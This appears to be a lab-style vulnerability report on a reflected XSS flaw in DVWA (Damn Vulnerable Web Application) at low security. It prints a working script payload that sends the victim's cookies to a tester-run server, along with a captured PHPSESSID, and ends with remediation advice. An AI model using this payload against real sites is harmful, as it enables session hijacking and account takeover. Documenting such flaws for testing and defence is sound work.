Vulnerability Report

Title: Reflected Cross Site Scripting (XSS) – Cookie Theft

Tester Name: Aayush
Role: Web Application Security Tester
Testing Environment: Kali Linux, DVWA (Low Security Level)

Description:
During testing of the DVWA application, a Reflected Cross Site Scripting (XSS) vulnerability was identified in the XSS (Reflected) module. The application reflects user input directly into the HTML response without proper input validation or output encoding. This allows an attacker to inject malicious JavaScript code which gets executed in the victim’s browser.

Vulnerability Type:
Reflected Cross Site Scripting (XSS)

Impact:
An attacker can steal session cookies of authenticated users. Using the stolen PHPSESSID cookie, the attacker can hijack the victim’s session and gain unauthorized access to the application. This may lead to account takeover, data leakage, and execution of arbitrary JavaScript code in the victim’s browser.

Attack Scenario:
An attacker crafts a malicious XSS payload and injects it into the vulnerable input field of the DVWA application. When the victim opens the manipulated URL, the injected JavaScript executes in the victim’s browser and sends the victim’s session cookies to an attacker-controlled server using a CGI script.

Proof of Concept:
The attacker sets up a CGI script on Kali Linux to capture cookies. The XSS payload redirects the victim’s browser to the attacker’s server along with the document.cookie value. The CGI script logs the received cookies into a text file.

XSS Payload Used:

<script>document.location="http://192.168.57.158/cgi-bin/logs.pl?cookie="+document.cookie</script>

Result:
When the payload was executed, the victim’s browser sent the session cookies to the attacker’s server. The cookies were successfully captured and stored in the logs file.

Captured Cookies:
cookie=security=low; PHPSESSID=kguojh1m1b8v97h7s8o98bdq9j; theme=dark

Conclusion:
The application is vulnerable to Reflected XSS due to improper input handling. This vulnerability can be exploited to steal session cookies and compromise user accounts.

Recommendation:
User input should be properly validated and encoded before reflecting it in the response. Cookies should be configured with HttpOnly and Secure flags to reduce the risk of cookie theft.